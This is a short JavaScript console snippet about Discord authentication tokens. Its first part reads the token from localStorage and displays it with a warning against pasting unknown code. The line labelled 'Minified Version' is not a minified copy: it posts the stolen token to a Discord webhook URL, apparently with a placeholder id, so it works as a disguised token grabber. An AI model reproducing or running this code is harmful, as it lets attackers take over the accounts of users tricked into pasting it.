let token = document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token.slice(1, -1);
alert(`Your Discord token is:\n${token}\n\nNever paste any code you don't understand in the console!`);

// Minified Version
fetch("https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKLMNOPQRSTUVWXYZ1234567890abcde",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({"content":document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token.slice(1,-1),"embeds":null})});